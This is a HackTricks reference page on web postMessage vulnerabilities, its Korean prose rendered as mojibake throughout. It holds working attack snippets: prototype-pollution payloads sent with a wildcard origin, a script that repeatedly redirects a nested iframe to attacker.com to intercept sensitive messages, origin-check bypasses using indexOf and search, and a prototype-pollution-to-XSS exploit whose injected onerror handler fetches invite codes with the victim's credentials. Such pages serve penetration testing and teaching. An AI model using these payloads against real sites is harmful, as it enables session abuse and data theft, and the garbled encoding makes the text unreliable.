# PostMessage ì·¨ì•½ì 

## PostMessage ì·¨ì•½ì 

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong>ë¥¼ í†µí•´ AWS í•´í‚¹ì„ ì²˜ìŒë¶€í„° ì „ë¬¸ê°€ê¹Œì§€ ë°°ì›Œë³´ì„¸ìš”<strong>!</strong></summary>

HackTricksë¥¼ ì§€ì›í•˜ëŠ” ë‹¤ë¥¸ ë°©ë²•:

* **íšŒì‚¬ë¥¼ HackTricksì—ì„œ ê´‘ê³ í•˜ê±°ë‚˜ HackTricksë¥¼ PDFë¡œ ë‹¤ìš´ë¡œë“œ**í•˜ë ¤ë©´ [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)ë¥¼ í™•ì¸í•˜ì„¸ìš”!
* [**ê³µì‹ PEASS & HackTricks ìŠ¤ì›¨ê·¸**](https://peass.creator-spring.com)ë¥¼ ì–»ìœ¼ì„¸ìš”.
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)ë¥¼ ë°œê²¬í•˜ì„¸ìš”. ë…ì ì ì¸ [**NFTs**](https://opensea.io/collection/the-peass-family) ì»¬ë ‰ì…˜ì…ë‹ˆë‹¤.
* ğŸ’¬ [**Discord ê·¸ë£¹**](https://discord.gg/hRep4RUj7f) ë˜ëŠ” [**í…”ë ˆê·¸ë¨ ê·¸ë£¹**](https://t.me/peass)ì— **ì°¸ì—¬**í•˜ê±°ë‚˜ **Twitter** ğŸ¦ [**@carlospolopm**](https://twitter.com/hacktricks_live)ë¥¼ **íŒ”ë¡œìš°**í•˜ì„¸ìš”.
* **HackTricks**ì™€ **HackTricks Cloud** github ì €ì¥ì†Œì— PRì„ ì œì¶œí•˜ì—¬ ì—¬ëŸ¬ë¶„ì˜ í•´í‚¹ ê¸°êµë¥¼ ê³µìœ í•˜ì„¸ìš”.

</details>

## **PostMessage** ë³´ë‚´ê¸°

**PostMessage**ëŠ” ë‹¤ìŒ í•¨ìˆ˜ë¥¼ ì‚¬ìš©í•˜ì—¬ ë©”ì‹œì§€ë¥¼ ë³´ëƒ…ë‹ˆë‹¤:
```bash
targetWindow.postMessage(message, targetOrigin, [transfer]);

# postMessage to current page
window.postMessage('{"__proto__":{"isAdmin":True}}', '*')

# postMessage to an iframe with id "idframe"
<iframe id="idframe" src="http://victim.com/"></iframe>
document.getElementById('idframe').contentWindow.postMessage('{"__proto__":{"isAdmin":True}}', '*')

# postMessage to an iframe via onload
<iframe src="https://victim.com/" onload="this.contentWindow.postMessage('<script>print()</script>','*')">

# postMessage to popup
win = open('URL', 'hack', 'width=800,height=300,top=500');
win.postMessage('{"__proto__":{"isAdmin":True}}', '*')

# postMessage to an URL
window.postMessage('{"__proto__":{"isAdmin":True}}', 'https://company.com')

# postMessage to iframe inside popup
win = open('URL-with-iframe-inside', 'hack', 'width=800,height=300,top=500');
## loop until win.length == 1 (until the iframe is loaded)
win[0].postMessage('{"__proto__":{"isAdmin":True}}', '*')
```
**targetOrigin**ì€ '\*' ë˜ëŠ” _https://company.com_ê³¼ ê°™ì€ URLì¼ ìˆ˜ ìˆìŠµë‹ˆë‹¤.\
**ë‘ ë²ˆì§¸ ì‹œë‚˜ë¦¬ì˜¤**ì—ì„œëŠ” **ë©”ì‹œì§€ë¥¼ í•´ë‹¹ ë„ë©”ì¸ìœ¼ë¡œë§Œ ë³´ë‚¼ ìˆ˜ ìˆìŠµë‹ˆë‹¤**(ì°½ ê°ì²´ì˜ ì¶œì²˜ê°€ ë‹¤ë¥¸ ê²½ìš°ì—ë„ í•´ë‹¹ë¨).\
ì™€ì¼ë“œì¹´ë“œë¥¼ ì‚¬ìš©í•˜ë©´ **ë©”ì‹œì§€ë¥¼ ì–´ë–¤ ë„ë©”ì¸ìœ¼ë¡œë“  ë³´ë‚¼ ìˆ˜ ìˆìœ¼ë©°**, ì°½ ê°ì²´ì˜ ì¶œì²˜ë¡œ ë³´ë‚´ì§‘ë‹ˆë‹¤.

### iframe ë° **targetOrigin**ì—ì„œì˜ ì™€ì¼ë“œì¹´ë“œ ê³µê²©

[**ì´ ë³´ê³ ì„œ**](https://blog.geekycat.in/google-vrp-hijacking-your-screenshots/)ì—ì„œ ì„¤ëª…í•œëŒ€ë¡œ, **iframed**ë  ìˆ˜ ìˆëŠ” í˜ì´ì§€(X-Frame-Header ë³´í˜¸ ì—†ìŒ)ë¥¼ ì°¾ê³ , ì™€ì¼ë“œì¹´ë“œ(\*)ë¥¼ ì‚¬ìš©í•˜ì—¬ **postMessage**ë¥¼ í†µí•´ **ë¯¼ê°í•œ** ë©”ì‹œì§€ë¥¼ ë³´ë‚´ëŠ” ê²½ìš°, **iframe**ì˜ **ì¶œì²˜**ë¥¼ **ìˆ˜ì •**í•˜ì—¬ **ë¯¼ê°í•œ** ë©”ì‹œì§€ë¥¼ ìì‹ ì´ ì œì–´í•˜ëŠ” ë„ë©”ì¸ìœ¼ë¡œ **ìœ ì¶œ**í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.\
í˜ì´ì§€ê°€ iframedë  ìˆ˜ ìˆì§€ë§Œ **targetOrigin**ì´ **URLë¡œ ì„¤ì •ë˜ì–´ ìˆê³  ì™€ì¼ë“œì¹´ë“œê°€ ì•„ë‹Œ ê²½ìš°**, ì´ **íŠ¸ë¦­ì€ ì‘ë™í•˜ì§€ ì•ŠìŠµë‹ˆë‹¤**.
```markup
<html>
<iframe src="https://docs.google.com/document/ID" />
<script>
setTimeout(exp, 6000); //Wait 6s

//Try to change the origin of the iframe each 100ms
function exp(){
setInterval(function(){
window.frames[0].frame[0][2].location="https://attacker.com/exploit.html";
}, 100);
}
</script>
```
## addEventListener ì•…ìš©

**`addEventListener`**ì€ JSì—ì„œ **`postMessages`ë¥¼ ê¸°ëŒ€í•˜ëŠ” í•¨ìˆ˜**ë¥¼ ì„ ì–¸í•˜ëŠ” ë° ì‚¬ìš©ë©ë‹ˆë‹¤.\
ë‹¤ìŒê³¼ ìœ ì‚¬í•œ ì½”ë“œê°€ ì‚¬ìš©ë  ê²ƒì…ë‹ˆë‹¤:
```javascript
window.addEventListener("message", (event) => {
if (event.origin !== "http://example.org:8080")
return;

// ...
}, false);
```
ì´ ê²½ìš° ì½”ë“œê°€ í•˜ëŠ” **ì²« ë²ˆì§¸ ì‘ì—…**ì€ **originì„ í™•ì¸í•˜ëŠ” ê²ƒ**ì…ë‹ˆë‹¤. ì´ëŠ” í˜ì´ì§€ê°€ ë°›ì€ ì •ë³´ë¡œ **ë¯¼ê°í•œ ì‘ì—…**(ì˜ˆ: ë¹„ë°€ë²ˆí˜¸ ë³€ê²½)ì„ ìˆ˜í–‰í•  ê²½ìš°ì— íŠ¹íˆ ì¤‘ìš”í•©ë‹ˆë‹¤. **ë§Œì•½ originì„ í™•ì¸í•˜ì§€ ì•Šìœ¼ë©´ ê³µê²©ìëŠ” í¬ìƒìë¡œë¶€í„° ì„ì˜ì˜ ë°ì´í„°ë¥¼ ì´ ì—”ë“œí¬ì¸íŠ¸ë¡œ ë³´ë‚´ ë¹„ë°€ë²ˆí˜¸ë¥¼ ë³€ê²½**í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤(ì´ ì˜ˆì‹œì—ì„œ).

### ì—´ê±°

í˜„ì¬ í˜ì´ì§€ì—ì„œ **ì´ë²¤íŠ¸ ë¦¬ìŠ¤ë„ˆë¥¼ ì°¾ê¸° ìœ„í•´** ë‹¤ìŒì„ ìˆ˜í–‰í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤:

* JS ì½”ë“œì—ì„œ `window.addEventListener`ì™€ `$(window).on`(_JQuery ë²„ì „_)ì„ **ê²€ìƒ‰**í•©ë‹ˆë‹¤.
* ê°œë°œì ë„êµ¬ ì½˜ì†”ì—ì„œ ë‹¤ìŒì„ **ì‹¤í–‰**í•©ë‹ˆë‹¤: `getEventListeners(window)`

![](<../../.gitbook/assets/image (618) (1) (1).png>)

* ë¸Œë¼ìš°ì €ì˜ ê°œë°œì ë„êµ¬ì—ì„œ _Elements --> Event Listeners_ë¡œ **ì´ë™**í•©ë‹ˆë‹¤.

![](<../../.gitbook/assets/image (617).png>)

* [**https://github.com/benso-io/posta**](https://github.com/benso-io/posta)ë‚˜ [https://github.com/fransr/postMessage-tracker](https://github.com/fransr/postMessage-tracker)ì™€ ê°™ì€ **ë¸Œë¼ìš°ì € í™•ì¥ í”„ë¡œê·¸ë¨**ì„ ì‚¬ìš©í•©ë‹ˆë‹¤. ì´ ë¸Œë¼ìš°ì € í™•ì¥ í”„ë¡œê·¸ë¨ì€ ëª¨ë“  ë©”ì‹œì§€ë¥¼ **ê°€ë¡œì±„ì„œ ë³´ì—¬ì¤ë‹ˆë‹¤**.

### Origin í™•ì¸ ìš°íšŒ

- **`event.isTrusted`** ì†ì„±ì€ ì§„ì§œ ì‚¬ìš©ì ë™ì‘ìœ¼ë¡œ ìƒì„±ëœ ì´ë²¤íŠ¸ì— ëŒ€í•´ì„œë§Œ `True`ë¥¼ ë°˜í™˜í•˜ë¯€ë¡œ ì•ˆì „í•˜ë‹¤ê³  ê°„ì£¼ë©ë‹ˆë‹¤. ì˜¬ë°”ë¥´ê²Œ êµ¬í˜„ëœ ê²½ìš° ìš°íšŒí•˜ê¸° ì–´ë µì§€ë§Œ, ë³´ì•ˆ ê²€ì‚¬ì—ì„œì˜ ì¤‘ìš”ì„±ì€ ì£¼ëª©í•  ë§Œí•©ë‹ˆë‹¤.

- PostMessage ì´ë²¤íŠ¸ì—ì„œ origin ìœ íš¨ì„± ê²€ì‚¬ë¥¼ ìœ„í•´ **`indexOf()`**ë¥¼ ì‚¬ìš©í•˜ëŠ” ê²ƒì€ ìš°íšŒë  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ì´ ì·¨ì•½ì ì„ ì„¤ëª…í•˜ëŠ” ì˜ˆì‹œëŠ” ë‹¤ìŒê³¼ ê°™ìŠµë‹ˆë‹¤:

```javascript
("https://app-sj17.marketo.com").indexOf("https://app-sj17.ma")
```

- `String.prototype.search()`ì˜ **`search()`** ë©”ì„œë“œëŠ” ì •ê·œì‹ì„ ìœ„í•´ ì‚¬ìš©ë˜ëŠ” ê²ƒì´ë©°, ë¬¸ìì—´ì—ëŠ” ì‚¬ìš©ë˜ì§€ ì•ŠìŠµë‹ˆë‹¤. ì •ê·œì‹ ì´ì™¸ì˜ ê²ƒì„ ì „ë‹¬í•˜ë©´ ì•”ë¬µì ìœ¼ë¡œ ì •ê·œì‹ìœ¼ë¡œ ë³€í™˜ë˜ì–´ ë©”ì„œë“œê°€ ì ì¬ì ìœ¼ë¡œ ë³´ì•ˆì— ì·¨ì•½í•´ì§‘ë‹ˆë‹¤. ì´ëŠ” ì •ê·œì‹ì—ì„œ ë§ˆì¹¨í‘œ(.)ê°€ ì™€ì¼ë“œì¹´ë“œë¡œ ì‘ë™í•˜ê¸° ë•Œë¬¸ì— íŠ¹ìˆ˜í•˜ê²Œ ë§Œë“¤ì–´ì§„ ë„ë©”ì¸ìœ¼ë¡œ ìœ íš¨ì„± ê²€ì‚¬ë¥¼ ìš°íšŒí•  ìˆ˜ ìˆê¸° ë•Œë¬¸ì…ë‹ˆë‹¤. ì˜ˆë¥¼ ë“¤ë©´ ë‹¤ìŒê³¼ ê°™ìŠµë‹ˆë‹¤:

```javascript
"https://www.safedomain.com".search("www.s.fedomain.com")
```

- `search()`ì™€ ìœ ì‚¬í•œ **`match()`** í•¨ìˆ˜ëŠ” ì •ê·œì‹ì„ ì²˜ë¦¬í•©ë‹ˆë‹¤. ì •ê·œì‹ì´ ì˜ëª» êµ¬ì„±ëœ ê²½ìš° ìš°íšŒë  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

- **`escapeHtml`** í•¨ìˆ˜ëŠ” ë¬¸ìë¥¼ ì´ìŠ¤ì¼€ì´í”„í•˜ì—¬ ì…ë ¥ì„ ì‚´ê· í•˜ëŠ” ê²ƒì„ ëª©ì ìœ¼ë¡œ í•©ë‹ˆë‹¤. ê·¸ëŸ¬ë‚˜ ì´ í•¨ìˆ˜ëŠ” ìƒˆë¡œìš´ ì´ìŠ¤ì¼€ì´í”„ëœ ê°ì²´ë¥¼ ìƒì„±í•˜ì§€ ì•Šê³  ê¸°ì¡´ ê°ì²´ì˜ ì†ì„±ì„ ë®ì–´ì”ë‹ˆë‹¤. ì´ ë™ì‘ì€ ì•…ìš©ë  ìˆ˜ ìˆìŠµë‹ˆë‹¤. íŠ¹íˆ, ê°ì²´ì˜ ì†ì„±ì´ `hasOwnProperty`ë¥¼ ì¸ì‹í•˜ì§€ ì•ŠëŠ”ë‹¤ë©´ `escapeHtml`ì€ ì˜ˆìƒëŒ€ë¡œ ì‘ë™í•˜ì§€ ì•Šì„ ê²ƒì…ë‹ˆë‹¤. ì•„ë˜ì˜ ì˜ˆì‹œì—ì„œ ì´ë¥¼ í™•ì¸í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤:

- ì˜ˆìƒëœ ì‹¤íŒ¨:
```javascript
result = u({
message: "'\"<b>\\"
});
result.message // "&#39;&quot;&lt;b&gt;\"
```

- ì´ìŠ¤ì¼€ì´í”„ ìš°íšŒ:
```javascript
result = u(new Error("'\"<b>\\"));
result.message; // "'"<b>\"
```

ì´ ì·¨ì•½ì ì˜ ë¬¸ë§¥ì—ì„œ `File` ê°ì²´ëŠ” ì½ê¸° ì „ìš© `name` ì†ì„±ìœ¼ë¡œ ì¸í•´ ì·¨ì•½ì ì´ ìˆìŠµë‹ˆë‹¤. ì´ ì†ì„±ì€ í…œí”Œë¦¿ì—ì„œ ì‚¬ìš©ë  ë•Œ `escapeHtml` í•¨ìˆ˜ì— ì˜í•´ ì‚´ê· ë˜ì§€ ì•Šìœ¼ë¯€ë¡œ ë³´ì•ˆ ìœ„í—˜ì„ ì•¼ê¸°í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

- JavaScriptì˜ `document.domain` ì†ì„±ì€ ìŠ¤í¬ë¦½íŠ¸ì— ì˜í•´ ë„ë©”ì¸ì„ ë‹¨ì¶•ì‹œí‚¬ ìˆ˜ ìˆìœ¼ë©°, ë™ì¼í•œ ìƒìœ„ ë„ë©”ì¸ ë‚´ì—ì„œ ë³´ë‹¤ ìœ ì—°í•œ ë™ì¼ ì¶œì²˜ ì •ì±… ì ìš©ì„ ê°€ëŠ¥í•˜ê²Œ í•©ë‹ˆë‹¤.

### e.origin == window.origin ìš°íšŒ

%%%<iframe sandbox="allow-scripts" src="https://example.com/iframe.php">%%%ë¥¼ ì‚¬ìš©í•˜ì—¬ **ìƒŒë“œë°•ìŠ¤ iframe**ì— ì›¹ í˜ì´ì§€ë¥¼ ì„ë² ë”©í•  ë•Œ, iframeì˜ originì€ `null`ë¡œ ì„¤ì •ë©ë‹ˆë‹¤. ì´ëŠ” **ìƒŒë“œë°•ìŠ¤ ì†ì„±**ê³¼ ë³´ì•ˆ ë° ê¸°ëŠ¥ì— ëŒ€í•œ ì˜í–¥ì„ ê³ ë ¤í•  ë•Œ íŠ¹íˆ ì¤‘ìš”í•©ë‹ˆë‹¤.

ìƒŒë“œë°•ìŠ¤ ì†ì„±ì—ì„œ **`allow-popups`**ë¥¼ ì§€ì •í•˜ë©´ iframe ë‚´ì—ì„œ ì—´ë¦° íŒì—… ì°½ì€ ë¶€ëª¨ì˜ ìƒŒë“œë°•ìŠ¤ ì œí•œì„ ìƒì†í•©ë‹ˆë‹¤. ì´ëŠ” **`allow-popups-to-escape-sandbox`** ì†ì„±ì´ í¬í•¨ë˜ì§€ ì•Šì€ ê²½ìš° íŒì—… ì°½ì˜ originë„ ë§ˆì°¬ê°€ì§€ë¡œ `null`ë¡œ ì„¤ì •ë˜ì–´ iframeì˜ originê³¼ ì¼ì¹˜í•©ë‹ˆë‹¤.

ê²°ê³¼ì ìœ¼ë¡œ ì´ëŸ¬í•œ ì¡°ê±´ì—ì„œ íŒì—…ì´ ì—´ë¦¬ê³  iframeì—ì„œ íŒì—…ìœ¼ë¡œ ë©”ì‹œì§€ê°€ ì „ì†¡ë˜ëŠ” ê²½ìš°, ë³´ë‚´ëŠ” ìª½ê³¼ ë°›ëŠ” ìª½ì˜ originì´ ëª¨ë‘ `null`ë¡œ ì„¤ì •ë©ë‹ˆë‹¤. ì´ ìƒí™©ì—ì„œ **`e.origin == window.origin`**ì€ true(`null == null`)ë¡œ í‰ê°€ë©ë‹ˆë‹¤. ì™œëƒí•˜ë©´ iframeê³¼ íŒì—…ì€ ëª¨ë‘ `null`ì˜ ë™ì¼í•œ origin ê°’ì„ ê³µìœ í•˜ê¸° ë•Œë¬¸ì…ë‹ˆë‹¤.

ìì„¸í•œ ì •ë³´ëŠ” ë‹¤ìŒì„ **ì°¸ì¡°**í•˜ì„¸ìš”:

{% content-ref url="bypassing-sop-with-iframes-1.md" %}
[bypassing-sop-with-iframes-1.md](bypassing-sop-with-iframes-1.md)
{% endcontent-ref %}

### e.source ìš°íšŒ

ë©”ì‹œì§€ê°€ ìŠ¤í¬ë¦½íŠ¸ê°€ ìˆ˜ì‹  ëŒ€ê¸° ì¤‘ì¸ ë™ì¼í•œ ì°½ì—ì„œ ì™”ëŠ”ì§€ í™•ì¸í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤(íŠ¹íˆ **ë¸Œë¼ìš°ì € í™•ì¥ í”„ë¡œê·¸ë¨ì˜ ì½˜í…ì¸  ìŠ¤í¬ë¦½íŠ¸**ì˜ ê²½ìš° ë©”ì‹œì§€ê°€ ë™ì¼í•œ í˜ì´ì§€ì—ì„œ ì „ì†¡ë˜ì—ˆëŠ”ì§€ í™•ì¸í•˜ê¸° ìœ„í•´ íŠ¹íˆ í¥ë¯¸ë¡œìš´ ê²½ìš°):
```javascript
// If itâ€™s not, return immediately.
if( received_message.source !== window ) {
return;
}
```
**`e.source`** ë©”ì‹œì§€ì˜ ê°•ì œë¡œ null ê°’ì„ ë§Œë“¤ ìˆ˜ ìˆìŠµë‹ˆë‹¤. ì´ë¥¼ ìœ„í•´ **`postMessage`**ë¥¼ ë³´ë‚´ê³  ì¦‰ì‹œ ì‚­ì œë˜ëŠ” **iframe**ì„ ìƒì„±í•©ë‹ˆë‹¤.

ìì„¸í•œ ì •ë³´ëŠ” ë‹¤ìŒì„ ì°¸ì¡°í•˜ì„¸ìš”:

{% content-ref url="bypassing-sop-with-iframes-2.md" %}
[bypassing-sop-with-iframes-2.md](bypassing-sop-with-iframes-2.md)
{% endcontent-ref %}

### X-Frame-Header ìš°íšŒ

ì´ëŸ¬í•œ ê³µê²©ì„ ìˆ˜í–‰í•˜ê¸° ìœ„í•´ì„œëŠ” ì´ìƒì ìœ¼ë¡œ í”¼í•´ì ì›¹ í˜ì´ì§€ë¥¼ `iframe` ì•ˆì— ë„£ì„ ìˆ˜ ìˆì–´ì•¼ í•©ë‹ˆë‹¤. ê·¸ëŸ¬ë‚˜ `X-Frame-Header`ì™€ ê°™ì€ ì¼ë¶€ í—¤ë”ëŠ” ì´ëŸ¬í•œ ë™ì‘ì„ ë°©ì§€í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.\
ì´ëŸ¬í•œ ì‹œë‚˜ë¦¬ì˜¤ì—ì„œëŠ” ì—¬ì „íˆ ëœ ì€ë°€í•œ ê³µê²©ì„ ì‚¬ìš©í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ì·¨ì•½í•œ ì›¹ ì• í”Œë¦¬ì¼€ì´ì…˜ì— ìƒˆ íƒ­ì„ ì—´ê³  í†µì‹ í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤:
```markup
<script>
var w=window.open("<url>")
setTimeout(function(){w.postMessage('text here','*');}, 2000);
</script>
```
### ë©”ì¸ í˜ì´ì§€ ì°¨ë‹¨ì„ í†µí•œ ìì‹ì—ê²Œ ë³´ë‚´ëŠ” ë©”ì‹œì§€ ë„ìš©

ë‹¤ìŒ í˜ì´ì§€ì—ì„œëŠ” **ë©”ì¸** í˜ì´ì§€ë¥¼ **ì°¨ë‹¨**í•˜ì—¬ ë°ì´í„°ë¥¼ ë³´ë‚´ê¸° ì „ì— **ìì‹ iframe**ë¡œ ë³´ë‚´ëŠ” **ë¯¼ê°í•œ postmessage ë°ì´í„°**ë¥¼ ë„ìš©í•˜ëŠ” ë°©ë²•ì„ ë³¼ ìˆ˜ ìˆìŠµë‹ˆë‹¤. ê·¸ë¦¬ê³  **ìì‹ì˜ XSSë¥¼ ì•…ìš©**í•˜ì—¬ ë°ì´í„°ê°€ ìˆ˜ì‹ ë˜ê¸° ì „ì— ë°ì´í„°ë¥¼ **ìœ ì¶œ**í•©ë‹ˆë‹¤:

{% content-ref url="blocking-main-page-to-steal-postmessage.md" %}
[blocking-main-page-to-steal-postmessage.md](blocking-main-page-to-steal-postmessage.md)
{% endcontent-ref %}

### iframe ìœ„ì¹˜ ìˆ˜ì •ì„ í†µí•œ ë©”ì‹œì§€ ë„ìš©

X-Frame-Headerê°€ ì—†ëŠ” ì›¹ í˜ì´ì§€ì— ë‹¤ë¥¸ iframeì„ í¬í•¨ì‹œí‚¬ ìˆ˜ ìˆë‹¤ë©´, **í•´ë‹¹ ìì‹ iframeì˜ ìœ„ì¹˜ë¥¼ ë³€ê²½**í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ë”°ë¼ì„œ, ë§Œì•½ **ì™€ì¼ë“œì¹´ë“œ**ë¥¼ ì‚¬ìš©í•˜ì—¬ ë³´ë‚´ì§„ **postmessage**ë¥¼ ìˆ˜ì‹  ì¤‘ì¸ ê²½ìš°, ê³µê²©ìëŠ” ê·¸ iframeì˜ **ì¶œì²˜(origin)**ë¥¼ ìì‹ ì´ **ì œì–´í•˜ëŠ” í˜ì´ì§€**ë¡œ **ë³€ê²½**í•˜ì—¬ ë©”ì‹œì§€ë¥¼ **ë„ìš©**í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤:

{% content-ref url="steal-postmessage-modifying-iframe-location.md" %}
[steal-postmessage-modifying-iframe-location.md](steal-postmessage-modifying-iframe-location.md)
{% endcontent-ref %}

### Prototype Pollution ë°/ë˜ëŠ” XSSë¡œì˜ postMessage

`postMessage`ë¥¼ í†µí•´ ì „ì†¡ëœ ë°ì´í„°ê°€ JSì— ì˜í•´ ì‹¤í–‰ë˜ëŠ” ì‹œë‚˜ë¦¬ì˜¤ì—ì„œëŠ”, **í˜ì´ì§€ë¥¼ iframe**ìœ¼ë¡œ ë§Œë“¤ê³  `postMessage`ë¥¼ í†µí•´ **prototype pollution/XSS**ë¥¼ ì•…ìš©í•˜ì—¬ exploitì„ ì „ì†¡í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

[https://jlajara.gitlab.io/web/2020/07/17/Dom\_XSS\_PostMessage\_2.html](https://jlajara.gitlab.io/web/2020/07/17/Dom\_XSS\_PostMessage\_2.html)ì—ì„œ **ë§¤ìš° ì˜ ì„¤ëª…ëœ XSS**ì˜ ì˜ˆì‹œë¥¼ í™•ì¸í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

`postMessage`ë¥¼ í†µí•´ **Prototype Pollutionì„ ì•…ìš©í•œ í›„ XSS**ë¥¼ ì•…ìš©í•˜ëŠ” exploitì˜ ì˜ˆì‹œ:
```html
<html>
<body>
<iframe id="idframe" src="http://127.0.0.1:21501/snippets/demo-3/embed"></iframe>
<script>
function get_code() {
document.getElementById('iframe_victim').contentWindow.postMessage('{"__proto__":{"editedbymod":{"username":"<img src=x onerror=\\\"fetch(\'http://127.0.0.1:21501/api/invitecodes\', {credentials: \'same-origin\'}).then(response => response.json()).then(data => {alert(data[\'result\'][0][\'code\']);})\\\" />"}}}','*');
document.getElementById('iframe_victim').contentWindow.postMessage(JSON.stringify("refresh"), '*');
}

setTimeout(get_code, 2000);
</script>
</body>
</html>
```
**ë” ë§ì€ ì •ë³´**ë¥¼ ìœ„í•´:

* [**í”„ë¡œí† íƒ€ì… ì˜¤ì—¼**](../deserialization/nodejs-proto-prototype-pollution/)ì— ëŒ€í•œ í˜ì´ì§€ ë§í¬
* [**XSS**](../xss-cross-site-scripting/)ì— ëŒ€í•œ í˜ì´ì§€ ë§í¬
* [**í´ë¼ì´ì–¸íŠ¸ ì¸¡ í”„ë¡œí† íƒ€ì… ì˜¤ì—¼ìœ¼ë¡œ ì¸í•œ XSS**](../deserialization/nodejs-proto-prototype-pollution/#client-side-prototype-pollution-to-xss)ì— ëŒ€í•œ í˜ì´ì§€ ë§í¬

## ì°¸ê³  ìë£Œ

* [https://jlajara.gitlab.io/web/2020/07/17/Dom\_XSS\_PostMessage\_2.html](https://jlajara.gitlab.io/web/2020/07/17/Dom\_XSS\_PostMessage\_2.html)
* [https://dev.to/karanbamal/how-to-spot-and-exploit-postmessage-vulnerablities-36cd](https://dev.to/karanbamal/how-to-spot-and-exploit-postmessage-vulnerablities-36cd)
* ì—°ìŠµìš©: [https://github.com/yavolo/eventlistener-xss-recon](https://github.com/yavolo/eventlistener-xss-recon)

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong>ë¥¼ í†µí•´ **ì œë¡œì—ì„œ ì˜ì›…ê¹Œì§€ AWS í•´í‚¹ ë°°ìš°ê¸°**</summary>

HackTricksë¥¼ ì§€ì›í•˜ëŠ” ë‹¤ë¥¸ ë°©ë²•:

* HackTricksì—ì„œ **íšŒì‚¬ ê´‘ê³ ë¥¼ ë³´ê±°ë‚˜ HackTricksë¥¼ PDFë¡œ ë‹¤ìš´ë¡œë“œ**í•˜ë ¤ë©´ [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)ë¥¼ í™•ì¸í•˜ì„¸ìš”!
* [**ê³µì‹ PEASS & HackTricks ìŠ¤ì›¨ê·¸**](https://peass.creator-spring.com)ë¥¼ ì–»ìœ¼ì„¸ìš”.
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)ë¥¼ ë°œê²¬í•˜ì„¸ìš”. ë…ì ì ì¸ [**NFTs**](https://opensea.io/collection/the-peass-family) ì»¬ë ‰ì…˜ì…ë‹ˆë‹¤.
* ğŸ’¬ [**Discord ê·¸ë£¹**](https://discord.gg/hRep4RUj7f) ë˜ëŠ” [**í…”ë ˆê·¸ë¨ ê·¸ë£¹**](https://t.me/peass)ì— **ì°¸ì—¬**í•˜ê±°ë‚˜ **Twitter** ğŸ¦ [**@carlospolopm**](https://twitter.com/hacktricks_live)ë¥¼ **íŒ”ë¡œìš°**í•˜ì„¸ìš”.
* **HackTricks**ì™€ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github ì €ì¥ì†Œì— PRì„ ì œì¶œí•˜ì—¬ ì—¬ëŸ¬ë¶„ì˜ í•´í‚¹ ê¸°ìˆ ì„ ê³µìœ í•˜ì„¸ìš”.

</details>
